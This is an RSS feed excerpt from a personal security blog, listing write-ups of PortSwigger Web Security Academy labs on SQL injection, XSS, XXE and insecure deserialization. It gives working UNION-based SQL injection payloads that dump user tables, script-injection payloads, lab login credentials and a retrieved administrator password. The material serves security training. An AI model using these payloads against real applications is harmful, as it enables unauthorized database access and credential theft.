+&lt;p>Loose Comparison Operator in &lt;code>PHP&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
+ Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
+ &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
+&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine # of columns
+Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
+ Lab: SQL injection attack, listing the database contents on Oracle
+ &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
+&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
+&lt;li>Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: &lt;code>UNION SELECT 'abc' FROM dual&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine # of columns
+Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
+ Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+ &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
+&lt;li>Goal: To solve the lab, display the database version string.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Consider # of column
+Payload: &lt;code>?category=Accessories' union select NULL,NULL -- #&lt;/code>&lt;/li>
+&lt;li>Consider column type
+Payload: &lt;code>?category=Accessories' union select 'a','a' -- #&lt;/code>
+Both of them contained text.&lt;/li>
+&lt;li>Attack
+Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/vOx5kCK.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
+ Lab: SQL injection attack, querying the database type and version on Oracle
+ &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
+&lt;li>Our Goal: To solve the lab, display the database version string.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">
+ Exp - &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database">SQLi Cheat Sheet - Examining the database in SQL injection attacks&lt;/a>
+ &lt;a class="anchor" href="#exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">#&lt;/a>
+&lt;/h2>
+&lt;p>According to the cheat sheet above, we can use the command to fetch the version of this database, e.g.
+&lt;img src="https://i.imgur.com/Qxtgz5u.png" alt="" />
+:::warning
+Before the recon, the hint told you that this database is created by &lt;code>Oracle&lt;/code>. So, you must contained &lt;code>From&lt;/code> preserved word in each query, e.g. &lt;code>SELECT 'abc' FROM dual&lt;/code>
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
+ Lab: SQL injection UNION attack, determining the number of columns returned by the query
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.&lt;/li>
+&lt;li>Hint: To solve the lab, determine the number of columns returned by the query by performing a &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION&lt;/a> attack that returns an additional row containing null values.&lt;/li>
+&lt;/ul>
+&lt;h4 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h4>
+&lt;p>Payload: &lt;code>https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/yZ3QPPF.png" alt="" />
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
+ Lab: SQL injection UNION attack, finding a column containing text
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.&lt;/li>
+&lt;li>Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine how many columns it has
+You can use the technique from previous question.
+Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
+ Lab: SQL injection UNION attack, retrieving data from other tables
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.&lt;/li>
+&lt;li>Hint: The database contains a different table called users, with columns called username and password.
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h4 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h4>
+&lt;ol>
+&lt;li>Using all technique we learned before
+According to union-based technique we learned before, we can consider there&amp;rsquo;re 2 columns in this database and both of them are text strings
+Payload: &lt;code>?category=Lifestyle' UNION SELECT 'Title name','Post content'--&lt;/code>&lt;/li>
+&lt;li>Find the detailed info in &lt;code>users&lt;/code> table
+Payload: &lt;code>?category=Lifestyle' UNION SELECT username, password FROM users--&lt;/code>&lt;/li>
+&lt;li>Login as administrator
+Username: &lt;code>administrator&lt;/code>
+Password: &lt;code>5kg73b7jinl9plif82d3&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/kiRM6bX.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
+ Lab: SQL injection UNION attack, retrieving multiple values in a single column
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.&lt;/li>
+&lt;li>Hint: The database contains a different table called users, with columns called username and password.
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Consider how many columns in this table
+Payload: &lt;code>?category=Lifestyle' UNION SELECT NULL,NULL--&lt;/code>&lt;/li>
+&lt;li>Consider the type of each columns
+Payload: &lt;code>?category=Lifestyle' UNION SELECT 1,'a'--&lt;/code>
+As the payload above, the 1st column is number-based string, and 2nd column is text-based string.
+:::spoiler Result
+&lt;img src="https://i.imgur.com/9V0cYHD.png" alt="" />
+:::&lt;/li>
+&lt;li>&lt;font color="FF0000">通靈&lt;/font>: Find username and password
+From the result above, there&amp;rsquo;s just one column is text-based string that we can inject, so we can use concatenate operator &lt;code>||&lt;/code> to concatenate two strings that we query together.
+Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--&lt;/code>
+:::spoiler Result
+&lt;img src="https://i.imgur.com/d1zw9eY.png" alt="" />
+:::&lt;/li>
+&lt;li>Login by username and password that we fetch
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/P9CLaQg.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</guid><description>&lt;h1 id="lab-stored-dom-xss">
+ Lab: Stored DOM XSS
+ &lt;a class="anchor" href="#lab-stored-dom-xss">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality.&lt;/li>
+&lt;li>Goal: To solve this lab, exploit this vulnerability to call the &lt;code>alert()&lt;/code> function.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Find the injected place
+According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.&lt;/p></description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</guid><description>&lt;h1 id="lab-using-application-functionality-to-exploit-insecure-deserialization">
+ Lab: Using application functionality to exploit insecure deserialization
+ &lt;a class="anchor" href="#lab-using-application-functionality-to-exploit-insecure-deserialization">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>
+&lt;p>Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&amp;rsquo;s home directory.&lt;/p>
+&lt;p>You can log in to your own account using the following credentials: wiener:peter
+You also have access to a backup account: gregg:rosebud&lt;/p></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
+ SQLi - APPRENTICE
+ &lt;a class="anchor" href="#sqli---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;p>[TOC]&lt;/p>
+&lt;h2 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">
+ Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+ &lt;a class="anchor" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: &lt;code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/pPKFYKj.png" alt="" />
+:::&lt;/p></description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</guid><description>&lt;h1 id="xss---apprentice">
+ XSS - APPRENTICE
+ &lt;a class="anchor" href="#xss---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;p>[TOC]&lt;/p>
+&lt;h2 id="lab-reflected-xss-into-html-context-with-nothing-encodedzero">
+ Lab: Reflected XSS into HTML context with nothing encoded:zero:
+ &lt;a class="anchor" href="#lab-reflected-xss-into-html-context-with-nothing-encodedzero">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.&lt;/li>
+&lt;li>Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function.&lt;/li>
+&lt;/ul>
+&lt;h3 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h3>
+&lt;p>Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/tvfxD4P.png" alt="" />
+:::&lt;/p>
+&lt;hr>
+&lt;h2 id="lab-stored-xss-into-html-context-with-nothing-encoded">
+ Lab: Stored XSS into HTML context with nothing encoded
+ &lt;a class="anchor" href="#lab-stored-xss-into-html-context-with-nothing-encoded">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality.&lt;/li>
+&lt;li>Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed.&lt;/li>
+&lt;/ul>
+&lt;h3 id="exp-1">
+ Exp
+ &lt;a class="anchor" href="#exp-1">#&lt;/a>
+&lt;/h3>
+&lt;p>You need to click into one post and comment something that contained script tag.
+Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/aArBCbN.png" alt="" />
+:::&lt;/p></description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</guid><description>&lt;h1 id="xxe---apprentice">
+ XXE - APPRENTICE
+ &lt;a class="anchor" href="#xxe---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input and returns any unexpected values in the response.&lt;/li>
+&lt;li>Goal: To solve the lab, inject an XML external entity to retrieve the contents of the &lt;code>/etc/passwd&lt;/code> file.&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files">
+ Lab: Exploiting XXE using external entities to retrieve files
+ &lt;a class="anchor" href="#lab-exploiting-xxe-using-external-entities-to-retrieve-files">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>Use Burp Suite to intercept package
+&lt;img src="https://i.imgur.com/gMn3Cbu.png" alt="" />
+You can notice that it use a normal xml format.&lt;/li>
+&lt;/ol>
+&lt;h3 id="exp---inject-directly">
+ Exp - Inject Directly
+ &lt;a class="anchor" href="#exp---inject-directly">#&lt;/a>
+&lt;/h3>
+&lt;p>Exploit Payload:&lt;/p></description></item></channel></rss>
